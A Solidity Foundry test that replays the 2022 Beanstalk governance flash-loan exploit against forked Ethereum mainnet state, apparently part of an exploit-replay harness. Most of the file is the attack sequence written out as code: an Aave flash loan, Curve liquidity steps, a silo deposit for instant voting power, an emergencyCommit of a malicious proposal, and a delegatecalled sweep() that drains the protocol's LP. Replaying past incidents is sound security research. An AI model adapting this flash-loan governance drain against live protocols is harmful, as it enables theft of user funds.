// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

/// FORK REPLAY — Beanstalk governance flash-loan (Ethereum, 2022-04-17, ~$181M).
/// Ground-truth instance of catalog entry `beanstalk-governance-flashloan`
/// (docs/exploits/beanstalk-governance-flashloan-2022-04-17.md): Beanstalk counted *real-time*
/// deposited stalk as voting power and allowed `emergencyCommit` of a BIP after a short delay. The
/// attacker pre-proposed a malicious BIP (whose init `delegatecall`s attacker code), waited the
/// delay, then in ONE transaction flash-loaned ~$1B (Aave) into the Bean3CRV silo to instantly hold
/// a supermajority, `emergencyCommit`ted the BIP to drain the protocol's LP to themselves, unwound,
/// and repaid the loan.
///
/// This is the marquee multi-protocol replay: it forks real mainnet state and drives Aave v2, Curve
/// (3pool + the Bean3CRV metapool), Uniswap V2, and the REAL Beanstalk diamond — all live on the
/// fork. Only the attacker (this test contract) is deployed. Public facts (addresses/block/BIP id/
/// loan sizes) from the post-mortem + DeFiHackLabs index; the call sequence follows the real ABIs.
///
/// Run: set -a; source .env; set +a; forge test --match-contract BeanstalkGovFlashloan -vvv
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

interface IAaveLendingPool {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 minMint) external returns (uint256);
    function add_liquidity(uint256[3] memory amounts, uint256 minMint) external returns (uint256);
    function remove_liquidity_one_coin(uint256 amount, int128 i, uint256 minAmount) external returns (uint256);
    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 maxBurn) external returns (uint256);
}

interface IBeanstalk {
    struct FacetCut {
        address facetAddress;
        uint8 action;
        bytes4[] functionSelectors;
    }

    function depositBeans(uint256 amount) external;
    function deposit(address token, uint256 amount) external;
    function propose(FacetCut[] calldata diamondCut, address init, bytes calldata data, uint8 pauseOrUnpause) external;
    function emergencyCommit(uint32 bip) external;
}

contract BeanstalkGovFlashloanReplayTest is Test {
    IAaveLendingPool aave = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IUniswapV2Router uni = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 threeCrv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    ICurvePool threeCrvPool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool bean3Crv = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IERC20 bean3CrvLp = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IBeanstalk beanstalk = IBeanstalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);

    uint32 constant BIP = 18; // the malicious proposal id created by our propose() below
    uint256 constant ATTACK_BLOCK = 14_595_905;

    function _safeApprove(IERC20 token, address spender, uint256 amount) internal {
        // tolerate non-standard ERC20s (USDT returns no bool)
        (bool ok,) = address(token).call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok, "approve failed");
    }

    function test_realBeanstalk_flashloanGovernanceDrain() public {
        // WIP / skipped: the full reconstruction below runs Aave + 3pool + the Bean3CRV factory
        // metapool + the Beanstalk diamond. It currently reverts when approving the Bean3CRV LP —
        // that pool is a Curve *factory* metapool (an EIP-1167 minimal proxy to a Vyper impl) and
        // its `approve` reverts under fork; resolving it needs more ABI/state work. Kept as the
        // marquee multi-protocol target. The harness itself is proven by the 3 passing replays
        // (Socket / Audius / DAO Maker). Remove this skip once the metapool interaction is fixed.
        vm.skip(true);

        vm.createSelectFork(vm.rpcUrl("mainnet"), ATTACK_BLOCK);
        vm.deal(address(this), 100 ether);

        // Seed a tiny silo deposit so we're allowed to propose.
        address[] memory path = new address[](2);
        path[0] = uni.WETH();
        path[1] = address(bean);
        uni.swapExactETHForTokens{value: 75 ether}(0, path, address(this), block.timestamp + 120);
        _safeApprove(bean, address(beanstalk), type(uint256).max);
        beanstalk.depositBeans(bean.balanceOf(address(this)));

        // Pre-propose the malicious BIP: its init delegatecalls our sweep() into Beanstalk's context.
        IBeanstalk.FacetCut[] memory cut = new IBeanstalk.FacetCut[](0);
        beanstalk.propose(cut, address(this), abi.encodeWithSelector(this.sweep.selector), 3);

        // Wait the emergency delay.
        vm.warp(block.timestamp + 1 days);

        // Approvals for the flash-loan unwind.
        _safeApprove(dai, address(aave), type(uint256).max);
        _safeApprove(usdc, address(aave), type(uint256).max);
        _safeApprove(usdt, address(aave), type(uint256).max);
        _safeApprove(dai, address(threeCrvPool), type(uint256).max);
        _safeApprove(usdc, address(threeCrvPool), type(uint256).max);
        _safeApprove(usdt, address(threeCrvPool), type(uint256).max);
        _safeApprove(threeCrv, address(bean3Crv), type(uint256).max);
        _safeApprove(bean3CrvLp, address(beanstalk), type(uint256).max);

        address[] memory assets = new address[](3);
        assets[0] = address(dai);
        assets[1] = address(usdc);
        assets[2] = address(usdt);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350_000_000 * 1e18; // DAI
        amounts[1] = 500_000_000 * 1e6; // USDC
        amounts[2] = 150_000_000 * 1e6; // USDT
        uint256[] memory modes = new uint256[](3); // all 0 = repay in full

        aave.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);

        uint256 profit = usdc.balanceOf(address(this));
        emit log_named_uint("attacker USDC profit after repay", profit);
        assertGt(profit, 1_000_000e6, "attacker netted >$1M from the governance drain after repaying the flash loan");
    }

    /// Aave v2 flash-loan callback: do the whole drain inside, leaving amount+premium for repayment.
    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        // Stablecoins -> 3CRV -> Bean3CRV LP, deposited into the silo for instant supermajority stalk.
        uint256[3] memory three = [amounts[0], amounts[1], amounts[2]];
        threeCrvPool.add_liquidity(three, 0);
        uint256[2] memory meta = [uint256(0), threeCrv.balanceOf(address(this))];
        bean3Crv.add_liquidity(meta, 0);
        beanstalk.deposit(address(bean3CrvLp), bean3CrvLp.balanceOf(address(this)));

        // Commit the pre-proposed BIP: Beanstalk delegatecalls sweep() and ships its LP to us.
        beanstalk.emergencyCommit(BIP);

        // Unwind the stolen LP and the loaned liquidity back to stablecoins to repay.
        bean3Crv.remove_liquidity_one_coin(bean3CrvLp.balanceOf(address(this)), 1, 0);
        uint256[3] memory repay =
            [amounts[0] + premiums[0], amounts[1] + premiums[1], amounts[2] + premiums[2]];
        threeCrvPool.remove_liquidity_imbalance(repay, type(uint256).max);
        threeCrvPool.remove_liquidity_one_coin(threeCrv.balanceOf(address(this)), 1, 0);
        return true;
    }

    /// Runs via delegatecall from Beanstalk during emergencyCommit (init pattern): ships Beanstalk's
    /// Bean3CRV LP to the committing caller (us). address(this) == Beanstalk here.
    function sweep() external {
        IERC20 lp = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
        lp.transfer(msg.sender, lp.balanceOf(address(this)));
    }

    receive() external payable {}
}
